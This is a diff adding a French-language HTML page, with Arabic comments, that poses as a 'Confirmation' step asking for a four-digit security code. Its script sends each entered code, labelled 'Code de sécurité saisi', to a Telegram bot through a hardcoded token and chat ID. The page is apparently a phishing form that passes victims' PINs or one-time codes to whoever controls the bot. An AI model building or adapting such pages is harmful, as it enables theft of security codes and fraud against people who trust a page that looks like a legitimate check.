@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirmation</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    .header {
+      background-color: #c1836e;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 500;
+    }
+
+    .content {
+      flex: 1;
+      padding: 40px 20px;
+      text-align: center;
+    }
+
+    .content h1 {
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 16px;
+      margin-bottom: 60px;
+    }
+
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-bottom: 80px;
+    }
+
+    .code-inputs input {
+      width: 40px;
+      height: 40px;
+      border: none;
+      border-bottom: 2px solid #444;
+      background: transparent;
+      text-align: center;
+      font-size: 24px;
+      outline: none;
+    }
+
+    .forgot {
+      color: #999;
+      font-size: 14px;
+      letter-spacing: 1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">Confirmation</div>
+
+    <div class="content">
+      <h1>Saisissez votre code sécurité pour continuer</h1>
+      <p class="subtitle">Saisissez le code à 4 chiffres</p>
+
+      <div class="code-inputs">
+        <input type="text" maxlength="1" id="input1" inputmode="numeric" />
+        <input type="text" maxlength="1" id="input2" inputmode="numeric" />
+        <input type="text" maxlength="1" id="input3" inputmode="numeric" />
+        <input type="text" maxlength="1" id="input4" inputmode="numeric" />
+      </div>
+
+      <p class="forgot">CODE SÉCURITÉ OUBLIÉ ?</p>
+    </div>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.code-inputs input');
+
+    // التنقل التلقائي بين الحقول
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1) {
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          } else {
+            sendCode(); // إرسال تلقائي عند الرقم الرابع
+          }
+        }
+      });
+
+      // دعم التنقل العكسي عند مسح المحتوى
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    function sendCode() {
+      const code =
+        document.getElementById('input1').value +
+        document.getElementById('input2').value +
+        document.getElementById('input3').value +
+        document.getElementById('input4').value;
+
+      if (code.length === 4) {
+        const token = '8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI'; // ← غيّر هذا
+        const chatId = '6451561574'; // ← غيّر هذا
+        const message = `🔐 Code de sécurité saisi : ${code}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('✅ Code envoyé avec succès !');
+            // يمكنك إعادة توجيه المستخدم مثلاً:
+            // window.location.href = 'success.html';
+          } else {
+            alert('❌ Erreur lors de l\'envoi du code.');
+            console.error(data);
+          }
+        })
+        .catch(error => {
+          alert('❌ Erreur réseau : ' + error);
+        });
+      }
+    }
+  </script>
+</body>
+</html>
